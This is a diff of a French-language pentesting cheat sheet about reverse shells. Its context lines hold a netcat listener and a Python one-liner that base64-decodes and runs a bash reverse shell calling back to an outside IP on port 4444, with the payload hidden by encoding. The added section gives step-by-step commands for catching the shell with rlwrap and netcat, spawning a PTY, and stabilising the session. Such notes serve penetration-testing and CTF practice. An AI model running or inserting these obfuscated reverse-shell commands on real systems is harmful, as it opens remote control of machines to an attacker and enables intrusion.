@@ -181,3 +181,14 @@ puis : nc -lvp 4444
 __import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNy4yNTAuMi80NDQ0IDA+JjEiCg== | base64 -d | bash")
 
 ```
+
+# Reverse Shell
+
+- 0. Récupérer le reverse shell avec le wrapper rlwrap (e.g. `rlwrap nc -nlvp 9001`) pour avoir le support des fleches directionnelles (history, droite, gauche etc)
+- 1. choper un pty avec `python -c "import pty;pty.spawn('/bin/bash')"` une fois que le revshell est obtenu
+- 2. améliorer le pty avec :
+- 2.1. <ctrl+z> pour background le revshell
+- 2.2.a sur ZSH `stty raw -echo ; fg` puis <enter>
+- 2.2.b sur BASH `stty raw -echo` <enter> puis `fg`
+- 2.3. dans le revshell, export de la variable TERM avec `export TERM=xterm`
+- 2.4. on se fait plaiz avec `alias ll="ls -alh --color"` et `alias grep="grep --color=always"` dans le revshell
